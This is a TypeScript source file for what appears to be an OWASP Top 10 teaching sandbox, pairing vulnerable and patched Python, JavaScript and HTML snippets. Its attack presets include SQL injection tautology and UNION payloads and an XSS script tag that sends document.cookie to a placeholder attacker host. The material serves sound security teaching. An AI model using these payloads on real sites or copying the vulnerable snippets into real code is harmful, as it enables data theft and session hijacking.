export type PageRoute = "/" | "/http-lifecycle" | "/owasp-lab" | "/report";

export type OwaspModuleId = "sqli" | "xss" | "idor" | "auth" | "misconfig";

export type LabPhase = "identify" | "test" | "fix" | "document";

export type SecurityMode = "vulnerable" | "patched";

export interface KeyObjective {
  number: number;
  text: string;
  targetRoute: PageRoute;
  targetLabel: string;
}

export interface CookiePolicy {
  httpOnly: boolean;
  secure: boolean;
  sameSite: "Strict" | "Lax" | "None";
  enforceRbac: boolean;
}

export interface CookieSecurityAssessment {
  status: "Hardened" | "At Risk";
  warnings: string[];
  protections: string[];
}

export interface ModuleRuntimeState {
  mode: SecurityMode;
  failedAttempts: number;
}

export interface FindingRecord {
  module_id: OwaspModuleId;
  identified: number;
  tested_exploit: number;
  applied_fix: number;
  documented: number;
  severity: "Critical" | "High" | "Medium";
  analyst_notes: string;
  evidence_summary: string;
  remediation_notes: string;
  updated_at: string;
}

export interface CodeLayerSnippet {
  language: "Python" | "JavaScript" | "HTML & CSS";
  vulnerable: string;
  patched: string;
}

export interface OwaspModuleSpec {
  id: OwaspModuleId;
  owaspCode: string;
  title: string;
  cwe: string;
  defaultSeverity: "Critical" | "High" | "Medium";
  summary: string;
  identifyPoints: string[];
  remediationSteps: string[];
  presets: { label: string; value: string; description: string }[];
  codeLayers: CodeLayerSnippet[];
}

export const KEY_OBJECTIVES: KeyObjective[] = [
  {
    number: 1,
    text: "Understand how web applications work, HTTP request/response lifecycles, cookies, sessions, and authentication/authorization.",
    targetRoute: "/http-lifecycle",
    targetLabel: "Open HTTP & Auth Inspector",
  },
  {
    number: 2,
    text: "Master the OWASP Top 10 vulnerabilities (Injections, Broken Access Control, Authentication Failures, XSS, etc.).",
    targetRoute: "/owasp-lab",
    targetLabel: "Explore OWASP Top 10",
  },
  {
    number: 3,
    text: "Learn secure coding practices and run a Secure Web Application Lab (Identify → Test → Fix → Document) in a safe sandbox.",
    targetRoute: "/owasp-lab",
    targetLabel: "Run Secure Sandbox",
  },
  {
    number: 4,
    text: "Submit OWASP Analysis, Vulnerability Report, Remediation Recommendations, and a demo walkthrough.",
    targetRoute: "/report",
    targetLabel: "Generate Report & Walkthrough",
  },
];

export const OWASP_MODULES: OwaspModuleSpec[] = [
  {
    id: "sqli",
    owaspCode: "A03:2021",
    title: "SQL Injection (SQLi)",
    cwe: "CWE-89",
    defaultSeverity: "Critical",
    summary:
      "Untrusted user input concatenated into Python sqlite3 queries alters SQL syntax, dumping protected salary and credential columns.",
    identifyPoints: [
      "Look for Python f-strings or string concatenation inside cursor.execute().",
      "Check whether user-supplied search strings can inject quotes, boolean tautologies, or UNION clauses.",
      "Inspect returned database columns to verify sensitive fields are excluded from query projections.",
    ],
    remediationSteps: [
      "Replace f-string SQL interpolation with parameterized ? placeholders in Python sqlite3.",
      "Limit SELECT projections strictly to non-sensitive display columns (exclude password hashes and salary).",
      "Validate input length and character format on both JavaScript client forms and Python server handlers.",
    ],
    presets: [
      { label: "Normal lookup (alice)", value: "alice", description: "Standard single-user lookup" },
      { label: "Tautology bypass", value: "' OR '1'='1", description: "Forces WHERE clause true for every row" },
      { label: "UNION secret extraction", value: "' UNION SELECT id, username, md5_hash, api_note, salary FROM users--", description: "Exfiltrates hashes and API notes" },
    ],
    codeLayers: [
      {
        language: "Python",
        vulnerable: `sql = f"SELECT id, username, role, email, salary FROM users WHERE username = '{query}'"\nrows = cursor.execute(sql).fetchall()`,
        patched: `sql = "SELECT id, username, role, email FROM users WHERE username = ?"\nrows = cursor.execute(sql, (query,)).fetchall()`,
      },
      {
        language: "JavaScript",
        vulnerable: `// Passes raw input without validation or structured encoding
fetch('/api/py/lab/sqli', { method: 'POST', body: JSON.stringify({ query }) })`,
        patched: `const cleanQuery = query.trim().slice(0, 64);
fetch('/api/py/lab/sqli', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ query: cleanQuery })
});`,
      },
      {
        language: "HTML & CSS",
        vulnerable: `<input type="text" name="username" placeholder="Search user" />
<!-- No pattern constraint or output table restriction -->`,
        patched: `<label for="sqli-user">Employee Username</label>
<input id="sqli-user" type="text" maxlength="64" autocomplete="off" />`,
      },
    ],
  },
  {
    id: "xss",
    owaspCode: "A03:2021",
    title: "Cross-Site Scripting (XSS)",
    cwe: "CWE-79",
    defaultSeverity: "High",
    summary:
      "Unescaped HTML comments rendered directly into DOM nodes allow attackers to execute arbitrary JavaScript and read non-HttpOnly cookies.",
    identifyPoints: [
      "Audit Python HTML templates and JavaScript innerHTML sinks for unescaped user strings.",
      "Verify whether <script>, <img onerror=...>, or javascript: URIs render as live DOM elements.",
      "Check HTTP response headers for a restrictive Content-Security-Policy (CSP).",
    ],
    remediationSteps: [
      "Encode all untrusted text in Python using html.escape(value, quote=True) before template interpolation.",
      "Use textContent instead of innerHTML in client-side JavaScript DOM updates.",
      "Enforce Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'.",
    ],
    presets: [
      { label: "Benign note", value: "Reviewed staging TLS configuration.", description: "Standard plain-text comment" },
      { label: "Script tag injection", value: "<script>fetch('https://attacker.test/?c='+document.cookie)</script>", description: "Classic reflected/stored script tag" },
      { label: "Image onerror handler", value: "<img src=x onerror=\"alert('XSS')\">", description: "Event-handler payload bypassing naive <script> filters" },
    ],
    codeLayers: [
      {
        language: "Python",
        vulnerable: `rendered = f'<div class="comment-item"><strong>{author}</strong><p>{comment}</p></div>'`,
        patched: `safe_author = html.escape(author, quote=True)
safe_comment = html.escape(comment, quote=True)
rendered = f'<div class="comment-item"><strong>{safe_author}</strong><p>{safe_comment}</p></div>'`,
      },
      {
        language: "JavaScript",
        vulnerable: `commentBox.innerHTML = data.renderedHtml; // Executes inline event handlers`,
        patched: `const p = document.createElement('p');
p.textContent = data.plainComment; // Safe text node
commentBox.appendChild(p);`,
      },
      {
        language: "HTML & CSS",
        vulnerable: `<!-- Missing Content-Security-Policy meta or server header -->
<div class="comment-feed"></div>`,
        patched: `<!-- Server sends CSP: default-src 'self'; script-src 'self' -->
<div class="comment-feed prose-safe"></div>`,
      },
    ],
  },
  {
    id: "idor",
    owaspCode: "A01:2021",
    title: "Broken Access Control (IDOR)",
    cwe: "CWE-639",
    defaultSeverity: "Critical",
    summary:
      "Sequential record IDs (/records?id=102) and admin endpoints lack server-side ownership or role checks, letting analysts read executive secrets.",
    identifyPoints: [
      "Test changing record IDs owned by other users while authenticated as a low-privilege analyst.",
      "Test invoking administrative endpoints (/admin/export) with a non-admin session.",
      "Verify authorization is enforced on the Python server, never merely hidden in HTML/CSS UI.",
    ],
    remediationSteps: [
      "Verify record.owner_id == session.user_id (or role == 'admin') inside the Python handler before returning data.",
      "Return HTTP 403 Forbidden whenever an authenticated user lacks ownership or required RBAC role.",
      "Never rely on client-side disabled buttons or hidden CSS classes as an access control boundary.",
    ],
    presets: [
      { label: "Own record (#101 as Alice)", value: "101", description: "Authorized access to Alice's own triage notes" },
      { label: "Peer payroll (#102 as Alice)", value: "102", description: "IDOR targeting Bob's confidential payroll" },
      { label: "Root KMS plan (#104 as Alice)", value: "104", description: "IDOR targeting Admin's TOP SECRET key plan" },
    ],
    codeLayers: [
      {
        language: "Python",
        vulnerable: `row = conn.execute("SELECT * FROM records WHERE id = ?", (record_id,)).fetchone()
return send_json(200, dict(row)) # No ownership check!`,
        patched: `row = conn.execute("SELECT * FROM records WHERE id = ?", (record_id,)).fetchone()
if row["owner_id"] != session.user_id and session.role != "admin":
    return send_json(403, {"error": "Forbidden"})
return send_json(200, dict(row))`,
      },
      {
        language: "JavaScript",
        vulnerable: `// Trusts client-supplied role header instead of server session
fetch('/api/py/lab/idor', { headers: { 'X-Role': localStorage.role } })`,
        patched: `// Client handles 403 explicitly; server derives role strictly from verified session
const res = await fetch('/api/py/lab/idor', { credentials: 'include' });
if (res.status === 403) showAccessDenied();`,
      },
      {
        language: "HTML & CSS",
        vulnerable: `<button class="admin-only hidden">Export All</button> <!-- Security by CSS hiding -->`,
        patched: `<!-- UI renders only allowed actions AND Python server enforces 403 Forbidden -->
<p class="text-slate-600">Access enforced server-side via session RBAC.</p>`,
      },
    ],
  },
  {
    id: "auth",
    owaspCode: "A07:2021",
    title: "Authentication Failures",
    cwe: "CWE-287",
    defaultSeverity: "High",
    summary:
      "Unsalted MD5 password hashes, predictable session tokens, and zero brute-force throttling allow rapid credential compromise.",
    identifyPoints: [
      "Inspect password storage algorithms for fast unsalted hashes (MD5/SHA-1).",
      "Check issued session tokens for low entropy or predictable username patterns.",
      "Submit repeated failed logins to test whether account throttling or lockout triggers.",
    ],
    remediationSteps: [
      "Hash passwords with salted scrypt/Argon2 and compare digests with hmac.compare_digest() in Python.",
      "Generate session identifiers via secrets.token_urlsafe(32) (256-bit cryptographic entropy).",
      "Enforce rate-limiting (HTTP 429 Too Many Requests) after 3 consecutive failed attempts.",
    ],
    presets: [
      { label: "Valid login (alice / alice123)", value: "alice123", description: "Compare MD5 predictable token vs scrypt CSPRNG token" },
      { label: "Brute-force guess (wrongpass)", value: "wrongpass", description: "Test rate-limiting after 3+ failed attempts" },
    ],
    codeLayers: [
      {
        language: "Python",
        vulnerable: `if hashlib.md5(pw.encode()).hexdigest() == user["md5_hash"]:
    token = f"sess-{username}-0001" # Predictable & no lockout`,
        patched: `if failed_attempts > 3:
    return send_json(429, {"error": "Too many attempts"})
if verify_scrypt(pw, user["scrypt_hash"]): # uses hmac.compare_digest
    token = secrets.token_urlsafe(32)`,
      },
      {
        language: "JavaScript",
        vulnerable: `// Stores token in localStorage where XSS can steal it
localStorage.setItem('token', data.issuedToken);`,
        patched: `// Server issues HttpOnly, Secure, SameSite=Strict cookie; JS handles 429 backoff
if (res.httpStatus === 429) disableSubmitWithRetryNotice();`,
      },
      {
        language: "HTML & CSS",
        vulnerable: `<input type="text" name="password" /> <!-- Plaintext visible input -->`,
        patched: `<input type="password" name="password" autocomplete="current-password" required />`,
      },
    ],
  },
  {
    id: "misconfig",
    owaspCode: "A05:2021",
    title: "Security Misconfiguration",
    cwe: "CWE-16",
    defaultSeverity: "Medium",
    summary:
      "Debug mode enabled in production leaks Python stack traces, database paths, and server versions while omitting browser security headers.",
    identifyPoints: [
      "Trigger an application error and check if Python tracebacks or file paths leak in the HTTP body.",
      "Inspect HTTP response headers for X-Content-Type-Options, X-Frame-Options, and Content-Security-Policy.",
      "Check Server banners for exact framework and Python runtime version disclosure.",
    ],
    remediationSteps: [
      "Disable debug tracebacks in HTTP responses; log full exceptions server-side and return an opaque reference ID.",
      "Attach X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Referrer-Policy: no-referrer, and CSP headers.",
      "Suppress detailed Server version strings on edge and Python handlers.",
    ],
    presets: [
      { label: "Trigger 500 error trace", value: "error", description: "Inspect verbose traceback vs opaque error reference ID" },
      { label: "Inspect normal 200 headers", value: "headers", description: "Audit missing vs hardened browser security headers" },
    ],
    codeLayers: [
      {
        language: "Python",
        vulnerable: `except Exception:
    return send_json(500, {"traceback": traceback.format_exc(), "dbPath": DB_PATH})`,
        patched: `except Exception:
    ref_id = f"err_{secrets.token_hex(4)}"
    return send_json(500, {"error": "Unexpected error", "referenceId": ref_id}, headers=SECURITY_HEADERS)`,
      },
      {
        language: "JavaScript",
        vulnerable: `// Displays raw server error object directly in UI
errorEl.textContent = JSON.stringify(err);`,
        patched: `// Shows user-safe support reference ID only
errorEl.textContent = \`Request failed (Ref: \${data.referenceId})\`;`,
      },
      {
        language: "HTML & CSS",
        vulnerable: `<!-- No frame-ancestors or nosniff policy; page embeddable in clickjacking iframe -->`,
        patched: `<!-- Enforced headers: X-Frame-Options: DENY, CSP frame-ancestors 'none', nosniff -->`,
      },
    ],
  },
];

export function normalizeRoute(pathname: string): PageRoute {
  const clean = pathname.split("?")[0].replace(/\/+$/, "") || "/";
  if (clean === "/http-lifecycle") return "/http-lifecycle";
  if (clean === "/owasp-lab") return "/owasp-lab";
  if (clean === "/report") return "/report";
  return "/";
}

export function evaluateCookieSecurity(policy: CookiePolicy): CookieSecurityAssessment {
  const warnings: string[] = [];
  const protections: string[] = [];

  if (policy.httpOnly) {
    protections.push("HttpOnly blocks document.cookie access from JavaScript/XSS.");
  } else {
    warnings.push("Missing HttpOnly: JavaScript can read session_id via document.cookie.");
  }

  if (policy.secure) {
    protections.push("Secure restricts cookie transmission strictly to encrypted HTTPS.");
  } else {
    warnings.push("Missing Secure: cookie can be leaked over plaintext HTTP traffic.");
  }

  if (policy.sameSite === "Strict" || policy.sameSite === "Lax") {
    protections.push(`SameSite=${policy.sameSite} mitigates cross-site request forgery (CSRF).`);
  } else {
    warnings.push("SameSite=None permits cross-origin POST requests to attach your session cookie.");
  }

  if (policy.enforceRbac) {
    protections.push("Server-side RBAC verifies role privileges before privileged endpoints run.");
  } else {
    warnings.push("Server-side RBAC disabled: non-admin sessions can execute admin exports.");
  }

  return {
    status: warnings.length === 0 ? "Hardened" : "At Risk",
    warnings,
    protections,
  };
}

export interface LabProgressSummary {
  totalModules: number;
  identifiedCount: number;
  testedCount: number;
  fixedCount: number;
  documentedCount: number;
  patchedLiveCount: number;
  completionPercent: number;
  postureLabel: "Baseline Vulnerable" | "Remediation In Progress" | "Hardened";
}

export function calculateLabProgress(
  findings: FindingRecord[],
  states: Record<string, ModuleRuntimeState>
): LabProgressSummary {
  const totalModules = OWASP_MODULES.length;
  const byId = new Map(findings.map((f) => [f.module_id, f]));

  let identifiedCount = 0;
  let testedCount = 0;
  let fixedCount = 0;
  let documentedCount = 0;
  let patchedLiveCount = 0;

  for (const mod of OWASP_MODULES) {
    const f = byId.get(mod.id);
    const liveMode = states[mod.id]?.mode ?? "vulnerable";
    if (f?.identified) identifiedCount += 1;
    if (f?.tested_exploit) testedCount += 1;
    if (f?.applied_fix || liveMode === "patched") fixedCount += 1;
    if (f?.documented) documentedCount += 1;
    if (liveMode === "patched") patchedLiveCount += 1;
  }

  // 4 steps per module = 20 total milestones
  const completedSteps = identifiedCount + testedCount + fixedCount + documentedCount;
  const completionPercent = Math.round((completedSteps / (totalModules * 4)) * 100);

  let postureLabel: LabProgressSummary["postureLabel"] = "Baseline Vulnerable";
  if (patchedLiveCount === totalModules) {
    postureLabel = "Hardened";
  } else if (patchedLiveCount > 0 || testedCount > 0 || documentedCount > 0) {
    postureLabel = "Remediation In Progress";
  }

  return {
    totalModules,
    identifiedCount,
    testedCount,
    fixedCount,
    documentedCount,
    patchedLiveCount,
    completionPercent,
    postureLabel,
  };
}

export function generateMarkdownReport(
  findings: FindingRecord[],
  states: Record<string, ModuleRuntimeState>,
  analystName = "Security Lab Analyst"
): string {
  const progress = calculateLabProgress(findings, states);
  const byId = new Map(findings.map((f) => [f.module_id, f]));
  const lines: string[] = [
    "# Web Application Security Assessment & OWASP Top 10 Report",
    "",
    `- **Prepared By:** ${analystName}`,
    `- **Stack Audited:** Python 3.10 HTTP/SQLite Backend · JavaScript · HTML · CSS`,
    `- **Overall Posture:** ${progress.postureLabel} (${progress.patchedLiveCount}/${progress.totalModules} modules patched)`,
    `- **Lab Completion:** ${progress.completionPercent}% (${progress.documentedCount}/${progress.totalModules} findings documented)`,
    "",
    "## 1. Executive Summary & HTTP/Auth Baseline",
    "",
    "This assessment evaluates web request/response lifecycles, cookie session flags (`HttpOnly`, `Secure`, `SameSite`), server-side role-based access control (RBAC), and five OWASP Top 10 vulnerability classes inside an isolated Python/SQLite sandbox.",
    "",
    "## 2. OWASP Top 10 Vulnerability Findings",
    "",
  ];

  for (const mod of OWASP_MODULES) {
    const f = byId.get(mod.id);
    const liveMode = states[mod.id]?.mode ?? "vulnerable";
    const severity = f?.severity || mod.defaultSeverity;
    const statusText = liveMode === "patched" ? "Remediated (Patched)" : "Open (Vulnerable)";

    lines.push(`### ${mod.owaspCode} — ${mod.title} (${mod.cwe})`);
    lines.push(`- **Severity:** ${severity}`);
    lines.push(`- **Sandbox Status:** ${statusText}`);
    lines.push(`- **Workflow Checkpoints:** Identify: ${f?.identified ? "Yes" : "No"} | Test: ${f?.tested_exploit ? "Yes" : "No"} | Fix: ${f?.applied_fix || liveMode === "patched" ? "Yes" : "No"} | Document: ${f?.documented ? "Yes" : "No"}`);
    lines.push(`- **Summary:** ${mod.summary}`);
    if (f?.evidence_summary?.trim()) {
      lines.push(`- **Observed Evidence:** ${f.evidence_summary.trim()}`);
    }
    if (f?.analyst_notes?.trim()) {
      lines.push(`- **Analyst Notes:** ${f.analyst_notes.trim()}`);
    }
    lines.push(`- **Remediation Recommendations:**`);
    if (f?.remediation_notes?.trim()) {
      lines.push(`  - ${f.remediation_notes.trim()}`);
    }
    for (const step of mod.remediationSteps) {
      lines.push(`  - ${step}`);
    }
    lines.push("");
  }

  lines.push("## 3. Demo Walkthrough Outline");
  lines.push("1. Demonstrate HTTP Request/Response lifecycle, `Set-Cookie` flags, and RBAC rejection (`403 Forbidden`).");
  lines.push("2. Execute SQL Injection, Stored XSS, IDOR, Weak Auth, and Error Leakage exploits in Vulnerable mode.");
  lines.push("3. Apply Python parameterized queries, `html.escape()` + CSP, server-side ownership checks, salted `scrypt`, and security headers.");
  lines.push("4. Re-run each exploit payload in Patched mode to prove remediation and review final security posture.");

  return lines.join("\n");
}
